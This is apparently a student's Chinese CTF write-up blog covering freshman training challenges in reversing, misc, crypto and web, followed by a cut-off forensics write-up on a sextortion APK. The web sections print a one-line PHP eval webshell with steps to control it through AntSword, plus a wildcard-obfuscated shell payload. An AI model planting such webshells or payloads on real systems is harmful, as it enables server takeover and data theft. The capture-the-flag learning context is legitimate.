0.</li></ul></li><li>&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-±±±]<ul><li>&lt; ; &gt;+97 ; [&lt;+&gt;-]</li><li>108. 0 ; 108 97. ; 108 + 97 = 205 0.</li></ul></li></ul></li><li>大概理解了，开造</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">brainfuck</span>(<span class="params">a</span>):</span><br><span class="line">    li = [<span class="number">0</span>]</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    kuo = []</span><br><span class="line">    output = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(a):</span><br><span class="line">        <span class="keyword">if</span> a[i] == <span class="string">&#x27;+&#x27;</span> <span class="keyword">or</span> a[i] == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            li[index] = <span class="built_in">eval</span>(<span class="built_in">str</span>(li[index]) + a[i] + <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(li) &lt;= index:</span><br><span class="line">                li.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">            index -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(li[index], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            output.append(li[index])</span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            li[index] = <span class="built_in">ord</span>(a[i])</span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> li[index] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">while</span> a[i] != <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                kuo.append(i)</span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> li[index] != <span class="number">0</span>:</span><br><span class="line">                i = kuo.pop()-<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                temp = kuo.pop()</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;+++++++++++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = a.replace(<span class="string">&#x27;[-]&#x27;</span>, <span class="string">&#x27;.[-]&#x27;</span>)</span><br><span class="line">output = brainfuck(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> output:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>解释：就是指针内容没有用.输出，所以在[-]删除前加输出从而得到结果</li><li>教训：人要好好学习不要偷懒用AI哈哈哈讲的差不多理解就是完全没理解</li></ul><h3 id="xor"><a class="header-anchor" href="#xor">¶</a>xor</h3><h4 id="第一步"><a class="header-anchor" href="#第一步">¶</a>第一步</h4><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_4-1.png" alt="alt text"></p><ul><li>循环28次（i从0到27）说明flag长度为28个字符</li><li>验证条件<ul><li>v4[i]：用户输入的第i个字符</li><li>(unsigned __int8)：将字符转换为无符号8位整数（0-255）</li><li>^ 0x7A：与十六进制0x7A（十进制122）进行异或运算</li><li>enc_0[i]：预设的正确加密值的第i个元素</li><li>!=：比较是否不相等</li></ul></li></ul><h4 id="第二步"><a class="header-anchor" href="#第二步">¶</a>第二步</h4><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_4-2.png" alt="alt text"></p><ul><li>db：Define Byte 表示定义字节数据</li><li>有 h 后缀：明确表示十六进制</li><li>n dup (a)：表示n个a</li></ul><h4 id="解密代码"><a class="header-anchor" href="#解密代码">¶</a>解密代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc_0 = [</span><br><span class="line">    <span class="number">0x34</span>, <span class="number">0x29</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x2E</span>, <span class="number">0x3C</span>, <span class="number">0x01</span>, <span class="number">0x22</span>, <span class="number">0x15</span>, <span class="number">0x08</span>, <span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x09</span>, <span class="number">0x25</span>, <span class="number">0x18</span>, <span class="number">0x1B</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x19</span>, <span class="number">0x25</span>, <span class="number">0x08</span>, <span class="number">0x1F</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x1F</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x1F</span>, <span class="number">0x07</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">enc_data</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> encrypted <span class="keyword">in</span> enc_data:</span><br><span class="line">        <span class="comment"># 异或解密：encrypted ^ 0x7A</span></span><br><span class="line">        original_char = encrypted ^ <span class="number">0x7A</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(original_char)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">flag = decrypt_flag(enc_0)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure><h3 id="这羽毛球怎么只有一半啊（恼）"><a class="header-anchor" href="#这羽毛球怎么只有一半啊（恼）">¶</a>这羽毛球怎么只有一半啊（恼）</h3><ul><li>crc高度题 010editor打开下方有报错信息，记得拉上来看！</li><li>代码</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;./羽毛球.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    <span class="comment">#打开图片</span></span><br><span class="line">crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)     <span class="comment">#读取图片中的CRC校验值</span></span><br><span class="line"><span class="built_in">print</span>(crc32frombp)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                        <span class="comment">#宽度1-4000进行枚举</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                    <span class="comment">#高度1-4000进行枚举</span></span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment">#print(crc32)</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32frombp):            <span class="comment">#计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span></span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h4 id="【待】"><a class="header-anchor" href="#【待】">¶</a>【待】</h4><ul><li>修改高度（额看了wp改的怎么找）bushi没法理解为什么修改这里<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_4-3.png" alt="alt text"></li></ul><h3 id="掩码爆破"><a class="header-anchor" href="#掩码爆破">¶</a>掩码爆破</h3><ul><li>如题，简单</li></ul><h3 id="F12"><a class="header-anchor" href="#F12">¶</a>F12?</h3><ul><li>当个别网页禁用F12，无法查看网页源代码时，可以通过地址栏操作后使用F12：</li><li>打开目标网页后，不要直接按F12，而是先用鼠标点击浏览器地址栏，全选当前网址。在全选网址的状态下，按下F12键。此时，部分网页可能会因为这一操作而解除对F12的禁用，从而允许你打开开发者工具查看源代码。</li></ul><h3 id="F12-v2"><a class="header-anchor" href="#F12-v2">¶</a>F12</h3><ul><li>极其简单，如题</li></ul><h3 id="test"><a class="header-anchor" href="#test">¶</a>test</h3><ul><li>极其简单，如题</li></ul><h3 id="word-03"><a class="header-anchor" href="#word-03">¶</a>word-03</h3><ul><li>伪加密<a href="https://blog.csdn.net/xiaozhaidada/article/details/124538768">参考</a><ul><li>特征：<ul><li>压缩源文件数据区的全局方式位标记应当为 00 00  （50 4B 03 04 14 00 后）</li><li>且压缩源文件目录区的全局方式位标记应当为 09 00   （50 4B 01 02 14 00 后）</li></ul></li><li>修改方法：<ul><li>确定是伪加密后就需要将其修改为无加密，方法很简单，就是将压缩源文件目录区的全局方式位标记从09 00改为00 00。</li></ul></li></ul></li><li>将这个word文件重命名为zip后，发现还能继续解压</li><li>找到flag</li><li>反思：搜索时注意是搜索文本还是十六进制，好愚蠢的问题已经第二次犯了|-_-··|</li></ul><h3 id="Basic-Number-theory"><a class="header-anchor" href="#Basic-Number-theory">¶</a>Basic Number theory</h3><ul><li>同余基本性质<ul><li>‌反身性‌：a ≡ a (mod m)，任何整数与其自身同余。</li><li>‌对称性‌：若a ≡ b (mod m)，则b ≡ a (mod m)，同余关系可逆。‌</li><li>‌传递性‌：若a ≡ b (mod m)且b ≡ c (mod m)，则a ≡ c (mod m)，允许链式推导。</li><li>‌运算性质‌：<ul><li>加减性：若a ≡ b (mod m)且c ≡ d (mod m)，则a±c ≡ b±d (mod m)。‌</li><li>乘性：若a ≡ b (mod m)且c ≡ d (mod m)，则ac ≡ bd (mod m)，推广至幂次有aⁿ ≡ bⁿ (mod m)。‌</li><li>消去律‌：若ca ≡ cb (mod m)且(c,m)=1（c与m互质），则a ≡ b (mod m)。‌‌</li></ul></li></ul></li><li>解决代码+详细计算过程</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">105567001902149483225233801278030547652749833525571608392930512645364400245999</span></span><br><span class="line">q = <span class="number">81511997683966846473333390828680375856568631631277717336250575831122994340471</span></span><br><span class="line">gift1 = <span class="number">105419799642658114984760815640014033297217363704585842609128111376906603236722</span></span><br><span class="line">gift2 = <span class="number">81364795424475478232860405190663861501036161810291951552448174562665197331194</span></span><br><span class="line"><span class="comment">#根据模运算的基本性质：如果 a ≡ b (mod n)，那么 a² ≡ b² (mod n)</span></span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(gift1 == <span class="built_in">pow</span>(gift1,<span class="number">1</span>,p))</span><br><span class="line"><span class="comment"># &gt;&gt;&gt; True</span></span><br><span class="line"><span class="comment"># 所以gift1² ≡ m^(q+1) (mod q)</span></span><br><span class="line"><span class="comment"># 继续用费马小定理：</span></span><br><span class="line"><span class="comment"># gift1² ≡ m^(q+1) (mod q)</span></span><br><span class="line"><span class="comment">#        ≡ m^q × m (mod q)</span></span><br><span class="line"><span class="comment"># 根据费马小定理：m^q ≡ m (mod q)（当 q 是素数时）</span></span><br><span class="line"><span class="comment"># gift1² ≡ m × m (mod q) ≡ m² (mod q)</span></span><br><span class="line"><span class="comment"># 实际上我们有：gift1^2 ≡ m^2 mod q ; gift2^2 ≡ m^2 mod p</span></span><br><span class="line"><span class="comment"># 这意味着：gift1^2 - m^2 ≡ 0 mod q  =&gt; q | (gift1^2 - m^2)</span></span><br><span class="line"><span class="comment">#          gift2^2 - m^2 ≡ 0 mod p  =&gt; p | (gift2^2 - m^2)</span></span><br><span class="line"><span class="comment"># 所以(gift1 - m)(gift1 + m) ≡ 0 mod q</span></span><br><span class="line"><span class="comment">#     (gift2 - m)(gift2 + m) ≡ 0 mod p</span></span><br><span class="line"><span class="comment"># 关键数学原理：在模素数的情况下，如果 a × b ≡ 0 mod p（其中 p 是素数），那么：</span></span><br><span class="line"><span class="comment"># 要么 a ≡ 0 mod p</span></span><br><span class="line"><span class="comment"># 要么 b ≡ 0 mod p</span></span><br><span class="line"><span class="comment"># 这是因为素数的一个重要性质：模素数的环是整环，没有零因子。</span></span><br><span class="line"><span class="comment"># 因此 m ≡ ±gift1 mod q ; m ≡ ±gift2 mod p</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="built_in">print</span>(math.gcd(p,q))</span><br><span class="line"><span class="comment"># &gt;&gt;&gt; 1</span></span><br><span class="line"><span class="comment"># https://oi-wiki.org/math/number-theory/crt/#%E8%BF%87%E7%A8%8B</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"></span><br><span class="line">a = [-gift1,-gift2]</span><br><span class="line">r = [p,q]</span><br><span class="line"></span><br><span class="line">m = crt(r, a)[<span class="number">0</span>]</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h3 id="basic-RSA"><a class="header-anchor" href="#basic-RSA">¶</a>basic-RSA</h3><ul><li>在RAS笔记里学长给做过，考察inverse()函数的应用</li></ul><h3 id="hackbar"><a class="header-anchor" href="#hackbar">¶</a>hackbar</h3><ul><li>hackbar浏览器插件使用方法：先LOAD后Use POST method加载网页<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-1.png" alt="alt text"></li><li>直接URL后面添加，插件里添加后按EXECUTE执行<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-2.png" alt="alt text"><br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-3.png" alt="alt text"></li><li>讲座后复刻，好像和学姐教的不一样？（但成功了~~后面问下</li><li>愚蠢，只需要下面部分，&lt;?php&gt;<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-4.png" alt="alt text"></li><li>第三关：浏览器身份挑战-要求：我要battlefield_six浏览器</li><li>直接更改User-Agent<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-5.png" alt="alt text"></li><li>要求：我要本地访问</li><li>解法：如图</li></ul><h3 id="super-baby-eval"><a class="header-anchor" href="#super-baby-eval">¶</a>super_baby_eval</h3><ul><li>网页</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;eval&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;eval&#x27;</span>] === <span class="string">&#x27;gogogo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;evalpost&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;evalpost&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-6.png" alt="alt text"><br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-7.png" alt="alt text"></p><ul><li>查看详细文件信息<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-8.png" alt="alt text"></li><li>硬搜flag获得<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-9.png" alt="alt text"><br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-10.png" alt="alt text"></li></ul><h3 id="baby-upload"><a class="header-anchor" href="#baby-upload">¶</a>baby_upload</h3><ul><li>上传php文件</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>打开Burpsuite代理，记录端口信息<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-11.png" alt="alt text"></li><li>打开中国蚁剑，右键添加数据，密码为php文件变量名<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-12.png" alt="alt text"></li><li>双击数据进入网站文件，根目录寻找flag</li><li>成功！</li><li><a href="https://www.yuque.com/antswordproject/antsword/uvmwzn">参考</a></li></ul><h3 id="baby-eval"><a class="header-anchor" href="#baby-eval">¶</a>baby_eval</h3><ul><li>hackbar body处输入code=/???/?a??64 /??a?</li><li>怀疑是/bin因为/?a?没反应应该不是cat</li><li>base64解码</li></ul><h3 id="super-baby-include"><a class="header-anchor" href="#super-baby-include">¶</a>super_baby_include</h3><ul><li>简单<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-13.png" alt="alt text"></li></ul><h3 id="robots"><a class="header-anchor" href="#robots">¶</a>robots</h3><ul><li>在HackBar的URL输入：<a href="http://xn--ces6a955gg50c/robots.txt">http://靶机地址/robots.txt</a></li><li>选择GET方法（不是POST）!!!</li><li>得到/f1agggggggg.txt</li><li>输入URL得到flag<a href="flag%7BYou_1InD_ROB0T5!!!_20576b704467%7D"></a></li></ul><h3 id="爆破"><a class="header-anchor" href="#爆破">¶</a>爆破</h3><ul><li>Burpsuite也可以，但注意光标偏移问题payload位置以添加完毕显示为准，而且有自动添加payload功能只是删除多余payload也要注意偏移问题！！！</li><li>yakit成功<a href="https://blog.csdn.net/miraclehw/article/details/134138197">参考</a><br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_5-14.png" alt="alt text"></li><li>没找到本地文件导入，但有临时文件导入按行读取功能一样成功，( •̀ ω •́ )耶</li></ul>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> 共模攻击 </tag>
            
            <tag> spc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三届长安杯笔记</title>
      <link href="/2025/10/01/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/10/01/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="鸣谢"><a class="header-anchor" href="#鸣谢">¶</a>鸣谢</h3><ul><li>感谢sq学长和cty学姐的帮助和教导！！！</li><li>第一个大型比赛复刻学习结束了，好累(｡し_し｡)但是继续出发(≧▽≦)哈哈哈</li></ul><h3 id="2021年4月25日，上午8点左右，警方接到被害人金某报案，声称自己被敲诈数万元；经询问，昨日金某被嫌疑人诱导裸聊，下载了某“裸聊”软件，导致自己的通讯录和裸聊视频被嫌疑人获取，对其进行敲诈，最终金某不堪重负，选择了报警；警方从金某提供的本人手机中，定向采集到了该“裸聊”软件的安装包–zhibo-apk（检材一），请各位回答下列问题：（题目中需要通过分析出来的答案对检材二三四五解压，解压密码为IP的情况，需要在密码后增加-CAB2021，例：192-168-100-100-CAB2021）"><a class="header-anchor" href="#2021年4月25日，上午8点左右，警方接到被害人金某报案，声称自己被敲诈数万元；经询问，昨日金某被嫌疑人诱导裸聊，下载了某“裸聊”软件，导致自己的通讯录和裸聊视频被嫌疑人获取，对其进行敲诈，最终金某不堪重负，选择了报警；警方从金某提供的本人手机中，定向采集到了该“裸聊”软件的安装包–zhibo-apk（检材一），请各位回答下列问题：（题目中需要通过分析出来的答案对检材二三四五解压，解压密码为IP的情况，需要在密码后增加-CAB2021，例：192-168-100-100-CAB2021）">¶</a>2021年4月25日，上午8点左右，警方接到被害人金某报案，声称自己被敲诈数万元；经询问，昨日金某被嫌疑人诱导裸聊，下载了某“裸聊”软件，导致自己的通讯录和裸聊视频被嫌疑人获取，对其进行敲诈，最终金某不堪重负，选择了报警；警方从金某提供的本人手机中，定向采集到了该“裸聊”软件的安装包–zhibo.apk（检材一），请各位回答下列问题：（题目中需要通过分析出来的答案对检材二三四五解压，解压密码为IP的情况，需要在密码后增加-CAB2021，例：192.168.100.100-CAB2021）</h3><h4 id="1-请计算检材一Apk的SHA256值："><a class="header-anchor" href="#1-请计算检材一Apk的SHA256值：">¶</a>1. 请计算检材一Apk的SHA256值：</h4><p>1）直接将apk拖入hashcal计算<br>2）雷电APP智能分析直接出，但注意SHA256的主体是检材</p><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-1.png" alt="alt text"><br>3）window自带工具：certutil -hashfile 检材一-zhibo.apk sha256</p><h4 id="2-该APK的应用包名为"><a class="header-anchor" href="#2-该APK的应用包名为">¶</a>2. 该APK的应用包名为</h4><p>1）使用jadx反编译，查看AndroidManifest.xml，package的值就是包名<br>2）雷电APP智能分析直接出</p><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-2.png" alt="alt text"></p><h4 id="3-该APK程序在封装服务商的应用唯一标识（APPID）为"><a class="header-anchor" href="#3-该APK程序在封装服务商的应用唯一标识（APPID）为">¶</a>3. 该APK程序在封装服务商的应用唯一标识（APPID）为</h4><ul><li>使用jadx反编译，可以在assets的apps目录下找到，文件夹名字就是</li><li>xml文件第一行后面也有 package=“plus.H5B8E45D3” ，应用包名后半部分与APPID一致（？不确定</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-5.png" alt="alt text"><br>——<a href="https://www.cnblogs.com/WXjzc/p/16113357.html">来源</a></p><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-6.png" alt="alt text"></p><p><strong>查证：</strong></p><ol><li>“应用ID必须至少包含两段（一个或多个圆点）。每段必须以字母开头，所有字符必须为字母数字或下划线 [a-zA-Z0-9_]。例如，com.example.myapp 是一个有效的应用ID。”——<a href="https://www.oryoy.com/news/yi-zhao-jiao-ni-qing-song-huo-qu-android-ying-yong-de-wei-yi-biao-shi-appid-a13839322.html">来源</a><br><strong>应该是写错了这个讲的是应用包名</strong></li><li>问deepseek</li></ol><!-- 让表格居中显示的风格 --><style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><div class="center"><table><thead><tr><th style="text-align:left">维度</th><th style="text-align:left">APK 包名</th><th style="text-align:left">服务商 APPID</th></tr></thead><tbody><tr><td style="text-align:left"><strong>定义与归属</strong></td><td style="text-align:left">技术身份：在代码中定义，是应用在安卓系统中的唯一技术标识。</td><td style="text-align:left">商业身份：由应用商店或服务商（如华为、腾讯、阿里）分配，是其在平台生态内的唯一商业标识。</td></tr><tr><td style="text-align:left"><strong>设定者</strong></td><td style="text-align:left">开发者。</td><td style="text-align:left">服务商平台系统（当开发者上传应用时生成或分配）。</td></tr><tr><td style="text-align:left"><strong>唯一性范围</strong></td><td style="text-align:left">全球唯一（理论上）。谷歌建议使用逆序域名来确保这一点（如 <code>com.companyname.appname</code>）。</td><td style="text-align:left">平台内唯一。同一个应用在不同商店可能有不同的 APPID。</td></tr><tr><td style="text-align:left"><strong>是否可变</strong></td><td style="text-align:left">不可变。一旦发布，更改包名等同于创建了一个全新的应用。</td><td style="text-align:left">通常不变，但理论上平台有权重新分配。同一个应用更新版本，其 APPID 不变。</td></tr><tr><td style="text-align:left"><strong>主要用途</strong></td><td style="text-align:left">1. 系统识别：安卓系统通过包名来区分不同应用。<br>2. 安装与更新：系统根据包名判断是安装新应用还是更新现有应用。<br>3. 进程标识：应用进程名通常以包名开头。</td><td style="text-align:left">1. 